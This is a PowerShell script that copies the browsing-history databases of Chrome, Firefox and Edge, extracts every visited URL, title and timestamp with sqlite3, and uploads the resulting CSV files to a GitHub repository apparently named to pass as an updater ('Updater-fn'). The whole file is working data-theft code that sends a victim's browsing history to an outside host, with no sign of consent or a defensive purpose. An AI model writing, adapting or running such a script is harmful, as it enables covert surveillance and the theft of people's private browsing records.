# GitHub repository details
$githubToken = $env:GITHUB_TOKEN  # Read token from environment variable
$repoOwner = "Milanv2l"
$repoName = "Updater-fn"
$branchName = "main"  # The branch where files will be uploaded

# Define paths for browser history
$chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$firefoxHistoryPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite"
$edgeHistoryPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"

$chromeOutput = "$env:TEMP\chrome_history.csv"
$firefoxOutput = "$env:TEMP\firefox_history.csv"
$edgeOutput = "$env:TEMP\edge_history.csv"

# Function to extract browser history
function Extract-BrowserHistory {
    param (
        [string]$historyPath,
        [string]$query,
        [string]$outputFile
    )
    $tempHistoryPath = "$env:TEMP\browser_history.db"

    # Copy the database to a temporary location
    Copy-Item -Path $historyPath -Destination $tempHistoryPath -Force

    # Execute the query and export results to a CSV
    $results = & sqlite3.exe $tempHistoryPath $query
    $results | Out-File -FilePath $outputFile

    # Clean up the temporary database copy
    Remove-Item -Path $tempHistoryPath -Force
}

# Queries for each browser
$chromeQuery = "SELECT urls.url, urls.title, visits.visit_time FROM urls, visits WHERE urls.id = visits.url ORDER BY visits.visit_time DESC"
$firefoxQuery = "SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC"
$edgeQuery = "SELECT urls.url, urls.title, visits.visit_time FROM urls, visits WHERE urls.id = visits.url ORDER BY visits.visit_time DESC"

# Extract history for each browser
if (Test-Path $chromeHistoryPath) {
    Extract-BrowserHistory -historyPath $chromeHistoryPath -query $chromeQuery -outputFile $chromeOutput
}
if (Test-Path $firefoxHistoryPath) {
    Extract-BrowserHistory -historyPath $firefoxHistoryPath -query $firefoxQuery -outputFile $firefoxOutput
}
if (Test-Path $edgeHistoryPath) {
    Extract-BrowserHistory -historyPath $edgeHistoryPath -query $edgeQuery -outputFile $edgeOutput
}

# Function to upload a file to GitHub
function Upload-ToGitHub {
    param (
        [string]$filePath,
        [string]$fileName
    )
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $fileBase64 = [Convert]::ToBase64String($fileContent)

    $url = "https://api.github.com/repos/$repoOwner/$repoName/contents/$fileName"
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
        "User-Agent" = "PowerShell"
    }
    
    $body = @{
        "message" = "Upload $fileName"
        "content" = $fileBase64
        "branch" = $branchName
    } | ConvertTo-Json

    try {
        $response = Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json"
        Write-Output "$fileName uploaded successfully."
    } catch {
        Write-Error "Failed to upload $fileName. Error: $_"
    }
}

# Upload extracted browser history files
Upload-ToGitHub -filePath $chromeOutput -fileName "chrome_history.csv"
Upload-ToGitHub -filePath $firefoxOutput -fileName "firefox_history.csv"
Upload-ToGitHub -filePath $edgeOutput -fileName "edge_history.csv"

